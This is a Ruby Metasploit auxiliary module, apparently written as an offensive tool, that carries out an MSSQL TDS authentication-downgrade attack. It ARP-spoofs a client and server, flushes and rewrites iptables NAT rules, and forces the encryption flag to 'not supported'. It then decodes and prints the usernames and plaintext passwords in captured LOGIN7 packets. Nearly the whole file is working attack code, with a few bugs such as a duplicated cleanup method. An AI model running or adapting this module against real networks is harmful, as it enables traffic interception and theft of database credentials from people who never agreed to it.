require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	alias_method :cleanup_tcp, :cleanup
	alias_method :run_tcp, :run
	include Msf::Exploit::Remote::TcpServer
	alias_method :cleanup_tcpserver, :cleanup
	alias_method :run_tcpserver, :run
	alias_method :exploit_tcpserver, :exploit

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MSSQL TDS Authentication Downgrade Attack with ARP Spoofing',
			'Description'    => %q{
				This module performs an MSSQL TDS downgrade attack with integrated ARP spoofing 
				and firewall rules setup to redirect traffic. If encryption is optional, a MITM 
				attack can downgrade the TDS encryption, allowing plaintext credential capture.
			},
			'Author'         => ['Necr0'],
			'License'        => BSD_LICENSE,
			'Version'        => "1.1",
			'References'     => [ ['URL', 'http://msdn.microsoft.com/en-us/library/dd304523%28v=PROT.13%29.aspx'] ],
			'Privileged'     => true,
			'DisclosureDate' => '2024-10-01'
		))

		deregister_options('SSL', 'SSLCert', 'SSLVersion', 'RPORT')
	
		register_options(
			[   OptString.new('INTERFACE', [ true, "Local listen interface", "eth0" ]),
                OptString.new('CLIENT', [ true, "Client IP address", "" ]),
                OptString.new('RHOSTS', [ true, "IP-Address of the Target MS-SQL Server.", "" ]),
				OptPort.new('SRVPORT', [ true, "TCP Port of the MS- SQL Server. Also local listen port", 1433 ]),
				OptString.new('SRVHOST', [ true, "Local listen address.", "0.0.0.0" ]),
				
			], self.class)
		
		datastore["RPORT"] = datastore["SRVPORT"]
	end
	
    def setup_firewall_and_arp
		interface = datastore['INTERFACE']
		server = datastore['RHOSTS']
		client = datastore['CLIENT']
		port = datastore['SRVPORT']

		print_status("Setting up firewall rules and ARP spoofing...")
		`iptables -F`
		`iptables -t nat -F`
		`iptables -t nat -A PREROUTING -p tcp --dport #{port} -j REDIRECT --to-port #{port}`

		@arp_spoof_server = fork { exec "arpspoof -i #{interface} -t #{server} #{client}" }
		@arp_spoof_client = fork { exec "arpspoof -i #{interface} -t #{client} #{server}" }

		print_status("ARP spoofing started between #{client} and #{server} on interface #{interface}.")
	end

    def cleanup
		print_status("Cleaning up ARP spoofing and firewall rules...")
		`iptables -F`
		`iptables -t nat -F`
		Process.kill('KILL', @arp_spoof_server) if @arp_spoof_server
		Process.kill('KILL', @arp_spoof_client) if @arp_spoof_client
		super
	end

	def retrieve_password(password)
		return password if password.nil? or password.length == 0
		password = password.unpack("C*")
		plain = []
		password.each do |char|
			a = char ^ 0xA5
			high = (a & 0xf0) >> 4
			low = (a & 0x0f) << 4
			a = high ^ low
			plain << a
		end
		return plain.pack("C*")
	end

	def run
        setup_firewall_and_arp
		exploit_tcpserver
	end
	alias_method :exploit, :run
	
	def cleanup
		cleanup_tcp()
		cleanup_tcpserver()
	end
    
    def on_client_connect(client)
    	print_status("client connected " + client.peerinfo())
    	connect()
	end

	def on_client_close(client)
		print_status("client disconnected " + client.peerinfo())
		disconnect()
	end
	
	def on_client_data(client)
		begin
			data = client.get_once()
			return if data.nil? or data.length == 0
			data = mangle_packet_from_client(data)
			sock.send(data, 0)
			respdata = sock.get_once()
			return if respdata.nil? or respdata.length == 0
			respdata = mangle_packet_from_server(respdata)
			client.put(respdata)
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::Exception
			print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	end
	
	def mangle_packet_from_client(packet)
		header_type = get_header_type(packet)
		pl = packet[8, packet.length]
		if header_type == 'PRELOGIN'
			pl = modify_prelogin(pl)
			return packet[0,8] << pl
		elsif header_type == "LOGIN7"
			pl = parse_login7(pl)
			return packet[0,8] << pl
		end #if
		return packet
	end #method
	
	def mangle_packet_from_server(packet)
		header_type = get_header_type(packet)
		pl = packet[8, packet.length]
		if header_type == 'PRELOGIN'
			pl = modify_prelogin(pl)
			return packet[0,8] << pl
		end #if
		return packet
	end #method
	
	def get_header_type(packet)
		hdr_type = packet[0].unpack("C")[0]
		if hdr_type == 0x12
			return "PRELOGIN"
		elsif hdr_type == 0x04
			return "Tabular Response"
		elsif hdr_type == 16
			return "LOGIN7"
		elsif hdr_type == 1
			return "SQL Batch"
		elsif hdr_type == 2
			return "Pre-TDS7 Login"
		elsif hdr_type == 3
			return "RPC"
		elsif hdr_type == 7
			return "Bulk load data"
		elsif hdr_type == 17
			return "SSPI"
		else
			return "Unkown"
		end
	end
	
	def modify_prelogin(prelogin)
		return prelogin if prelogin.nil? or prelogin.length == 0
		i = 0
		while prelogin[i].unpack('C')[0] != 0xFF do
			position, length = prelogin[i+1,i+5].unpack("nn")
			option_token = prelogin[i].unpack("C")[0]
			if option_token == 0x00 
				if length != 6
					
					print_status("Error: Skipping current packet")
					return prelogin
				end
				version, subbuild = prelogin[position,position+length].unpack(">Nn")
				print_status("version: 0x" + version.to_s(16) + " subbuild: 0x" + subbuild.to_s(16))
			elsif option_token == 0x01
				if length != 1
					
					print_status("Error: Skipping current packet")
					return prelogin
				end
				enc = prelogin[position].unpack("C")[0]
				if enc == 0x00
					print_status("ENCRYPT is set to ENCRYPT_OFF")
				elsif enc == 0x01
					print_status("ENCRYPT is set to ENCRYPT_ON")
					print_status("Depending on the used client, the attack will probably not succeed!")
				elsif enc == 0x02
					print_status("ENCRYPT is set to ENCRYPT_NOT_SUP")
					print_status("Encryption is not supported, we will be able to see the cleartext password")
				elsif enc == 0x03
					print_status("ENCRYPT is set to ENCRYPT_REQ")
					print_status("This suggests a secure configuration!")
				else
					print_status("ENCRYPT set to 0x" + enc.to_s(16) + 
									" for some reason. This is out of spec... Let's skip it!")
					return packet
				end
            
				if enc != 0x02
					print_status("Setting to: ENCRYPT_NOT_SUP == 0x02")
					prelogin[position] = "\x02"
				end
				
				break 
			end
			i += 5
		end 
		
		return prelogin
		
	end #method
	
	def parse_login7(tds_pl) 
		print_status("Found TDS LOGIN7 packet, dumping information:")
		print_status("#############################################")
		['HostName', 'UserName', 'Password','Application', 'Server', nil, 'Library'].zip((36..62).step(4)).each do |name, o|
			if not name.nil?
				offset, length = tds_pl[o, 4].unpack("vv")
				length = length * 2 
				val = tds_pl[offset, length]
				if name == "Password"
					val = retrieve_password(val)
				end
				print_status(name + ": " + val.force_encoding("ISO-8859-1").encode("UTF-8"))			
			end
		end 
		print_status("#############################################")
		return tds_pl
	end 
	
end 
